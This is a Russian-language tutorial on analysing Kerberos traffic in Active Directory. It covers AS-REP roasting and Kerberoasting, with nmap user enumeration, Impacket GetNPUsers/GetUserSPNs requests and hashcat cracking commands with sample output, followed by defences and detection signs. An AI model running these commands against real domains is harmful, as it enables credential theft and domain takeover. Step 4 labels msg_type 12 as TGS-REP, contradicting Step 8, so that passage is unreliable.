## Вопрос, с которого всё начинается

В корпоративной сети есть домен Active Directory. Все логины идут через Kerberos — протокол, который выдаёт «билеты» вместо паролей. Что видно в этом трафике, если пароля у нас нет? И почему из самого факта «клиент попросил билет» иногда получается учётная запись?

Разберём Kerberos глазами сети: какие сообщения ходят, что в них читается и какие атаки из этого растут.

## Наш пример: пользователь `alice` входит в домен

Пусть пользователь `alice` (рабочая станция `10.0.0.5`) хочет получить доступ к файловому серверу в домене `EXAMPLE.LOCAL`. Контроллер домена (KDC) — `10.0.0.1`, порт `88`. Протокол работает по **UDP/88** (и TCP/88 для крупных сообщений).

Kerberos использует свой набор сообщений. Два главных:

- **AS-REQ / AS-REP** — «аутентификация»: клиент просит у KDC билет на **себя** (TGT, Ticket-Granting Ticket).
- **TGS-REQ / TGS-REP** — «сервис»: клиент предъявляет TGT и просит билет на **конкретный сервис** (ST, Service Ticket).

## Шаг 1: что видно в AS-REQ

Посмотрим, какие поля вообще есть в Kerberos-пакетах — их можно извлечь `tshark`.

```
$ tshark -G fields | grep kerberos.CNameString
kerberos.CNameString   FT_STRING
```

Полезные поля: `kerberos.CNameString` (имя клиента), `kerberos.SNameString` (имя сервиса), `kerberos.realm` (домен), `kerberos.msg_type` (тип сообщения), `kerberos.cipher` (зашифрованная часть). Извлечь их из дампа можно так:

```
$ tshark -r krb.pcap -T fields -e kerberos.msg_type -e kerberos.CNameString -e kerberos.SNameString
10  alice  krbtgt
```

`msg_type 10` — это **AS-REQ**. Видно, что клиент `alice` просит билет на `krbtgt` — специальный аккаунт-«сертификат» самого KDC. Так начинается вход в домен.

Ключевая деталь: **имя пользователя в AS-REQ передаётся открытым текстом**. Это нормально (пароля там нет), но даёт атакующему список валидных логинов.

## Шаг 2: AS-REP и pre-auth

В ответ KDC шлёт AS-REP с зашифрованным TGT. Обычно перед этим KDC требует **pre-authentication** (предварительную аутентификацию): клиент должен доказать, что знает пароль, зашифровав метку времени своим ключом. Только после этого KDC отдаёт TGT.

Но есть мисконфигурация: флаг **`DONT_REQ_PREAUTH`** на учётной записи. Если он выставлен, KDC отдаёт AS-REP **без** проверки, что клиент знает пароль. И тогда AS-REP содержит данные, зашифрованные **парольным хэшем пользователя**.

## Шаг 3: AS-REP roasting

Отсюда атака **AS-REP roasting**. Мы просто шлём AS-REQ от имени пользователя без pre-auth и получаем AS-REP, где часть зашифрована хэшем его пароля. Пароль по сети не идёт, но у нас есть **материал для оффлайн-подбора**.

Инструмент `nmap` умеет перечислять пользователей Kerberos:

```
$ nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='EXAMPLE.LOCAL' 10.0.0.1
```

А специализированные утилиты (например, `kerbrute`) находят учётки с `DONT_REQ_PREAUTH` и вытаскивают AS-REP для оффлайн-крекинга (hashcat, режим `18200`). Это один из самых частых входов в домен.

## Шаг 4: Kerberoasting

Вторая классическая атака — **Kerberoasting**. В домене у сервисов есть **SPN** (Service Principal Name) — имя вида `MSSQLSvc/db.example.local:1433`. Любой аутентифицированный пользователь может попросить у KDC билет (TGS) на такой сервис.

Проблема: TGS-REP зашифрован **ключом сервисного аккаунта**, выведенным из его пароля. Запрос билета — легитимная операция, но, получив его, мы можем **оффлайн** подбирать пароль сервисного аккаунта. А сервисные учётки часто имеют слабые, годами не меняющиеся пароли и высокие права.

На проводе это выглядит как TGS-REQ с интересным `SNameString` (имя SPN) и последующим TGS-REP. `tshark` покажет:

```
$ tshark -r krb.pcap -T fields -e kerberos.msg_type -e kerberos.SNameString -e kerberos.cipher
12  MSSQLSvc  0102a4...
```

`msg_type 12` — TGS-REP, `cipher` — зашифрованная часть, которую и брутят оффлайн.

## Шаг 5: почему оффлайн — это дёшево

Заметь общий приём обеих атак: мы **не подбираем пароль онлайн**. Мы получаем зашифрованный блоб и считаем кандидатов **локально** (GPU, hashcat). Это на порядки быстрее и не шумит в логах. Онлайн-брут Kerberos быстро приводит к блокировке учётки по политике (lockout) — поэтому здесь он противопоказан.

## Шаг 6: релей и другие векторы

Есть и сетевые атаки на аутентификацию:

- **Релей** — «проброс» аутентификации жертвы на другой сервис (часто NTLM, но и Kerberos-варианты).
- **Silver/Golden ticket** — подделка билетов при наличии ключа сервиса/`krbtgt`. Это уже пост-эксплуатация.
- **Перехват** — если есть ключ, можно расшифровать часть трафика; без ключа — нет.

## Шаг 7: защита и детект

- **Убрать `DONT_REQ_PREAUTH`** — тогда AS-REP roasting невозможен.
- **Сложные пароли сервисных аккаунтов** (или gMSA с автоматической ротацией) — тогда Kerberoasting не окупается.
- **Мониторинг:** массовые AS-REQ без pre-auth, запросы TGS к множеству SPN подряд, аномальные `cipher` — сигналы. События 4768/4769 в логах Windows.
- **Аудит SPN:** сервисные учётки с высокими правами — приоритетная цель, их надо либо усилить, либо перевести на gMSA.

## Шаг 8: мини-практика — читаем Kerberos в дампе

Если у тебя есть pcap с Kerberos-трафиком, вот как его быстро разобрать. Сначала посмотрим, какие типы сообщений вообще есть в захвате:

```
$ tshark -r krb.pcap -T fields -e kerberos.msg_type | sort | uniq -c
      4 10
      3 11
      2 12
      1 13
```

Читается так: `10` — AS-REQ, `11` — AS-REP, `12` — TGS-REQ, `13` — TGS-REP. Уже по этому распределению видно, что было: вход в домен (AS) и запросы к сервисам (TGS).

Дальше извлекаем имена:

```
$ tshark -r krb.pcap -Y "kerberos.msg_type==10" -T fields -e kerberos.CNameString -e kerberos.SNameString
alice   krbtgt
```

Так мы получаем список **валидных логинов** и понимаем, к каким сервисам обращались. Это пассивная разведка: мы ничего не отправляли, только читали. А если в дампе есть AS-REP для учётки без pre-auth — рядом лежит материал для оффлайн-подбора.

## Что мы теперь знаем

- Kerberos выдаёт билеты: AS-REQ/AS-REP (TGT) и TGS-REQ/TGS-REP (сервисный билет).
- Имя клиента и запрошенный сервис видны в трафике.
- AS-REP roasting бьёт по учёткам без pre-auth, Kerberoasting — по сервисным аккаунтам со SPN.
- Обе атаки дают материал для **оффлайн**-подбора, а не онлайн-брута.
- Лечение — pre-auth, сложные пароли/gMSA, мониторинг событий.

## Разбор AS-REP hash: от байтов до hashcat

Вернёмся к учётке без pre-auth. Когда мы шлём AS-REQ и получаем AS-REP, зашифрованная часть — это не «пароль» и не «хэш пароля» в привычном смысле. Это **блоб**, зашифрованный ключом, который выведен из пароля (для AES — PBKDF2, для RC4 — сам NT-хэш). Именно поэтому подбор идёт оффлайн: мы перебираем кандидатов, шифруем каждый тем же алгоритмом и сравниваем с блобом.

Инструмент `GetNPUsers.py` из набора Impacket делает всё за нас — сам находит AS-REP roastable учётки и печатает строку в формате, который понимает hashcat:

```
$ GetNPUsers.py EXAMPLE.LOCAL/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat -outputfile asrep.txt
$ cat asrep.txt
$krb5asrep$23$svc_backup@EXAMPLE.LOCAL:8f3c1e...:a1b2c3...
```

Читается строка так: `$krb5asrep$` — тип, `23` — тип шифрования RC4-HMAC, далее имя учётки, затем два шестнадцатеричных поля (зашифрованный блоб и соль/вектор). Дальше — hashcat:

```
$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc_backup@EXAMPLE.LOCAL:8f3c1e...:Summer2019
```

Обрати внимание: пароль найден **оффлайн**, на своей GPU. В сети домена при этом не появилось ни одного лишнего запроса после исходного AS-REQ — в логах останется одна строка.

## Kerberoasting руками: смотрим на SPN

Теперь второй вектор. Любой аутентифицированный пользователь может перечислить учётки со SPN и запросить на них билеты. `GetUserSPNs.py`:

```
$ GetUserSPNs.py EXAMPLE.LOCAL/alice:Password1 -dc-ip 10.0.0.1 -request
ServicePrincipalName            Name        MemberOf        PasswordLastSet
----------------------------    ----------  --------------  -------------------
MSSQLSvc/db.example.local:1433  svc_sql     Domain Admins   2020-03-11 09:14
$krb5tgs$23$*svc_sql$EXAMPLE.LOCAL$MSSQLSvc/db.example.local:1433*$9e2a...
```

Ключевая деталь — колонка `MemberOf`: сервисный аккаунт состоит в `Domain Admins`. Если пароль такого аккаунта слабый, его оффлайн-подбор (hashcat `-m 13100`) отдаёт нам фактически администратора домена. Именно поэтому Kerberoasting так ценят: запрос билета — легитимная операция, а входной точки почти не требуется.

## Что искать в трафике: быстрый чек-лист

| Признак в дампе | Что это значит |
|---|---|
| `msg_type 10` от многих клиентов к `krbtgt` | массовые AS-REQ — вход в домен или перечисление |
| `msg_type 11` без предшествующего pre-auth | возможный AS-REP roast |
| Серия `msg_type 12` к разным SPN от одного клиента | похоже на Kerberoasting |
| Один клиент перебирает `CNameString` | user enumeration (kerbrute) |

Практический вывод: сетевой анализ Kerberos почти всегда начинается с `tshark -r krb.pcap -Y kerberos -T fields -e kerberos.msg_type -e kerberos.CNameString -e kerberos.SNameString`. Уже по этому распределению видно, был ли в сети brute-force, массовый запрос билетов или разведка.
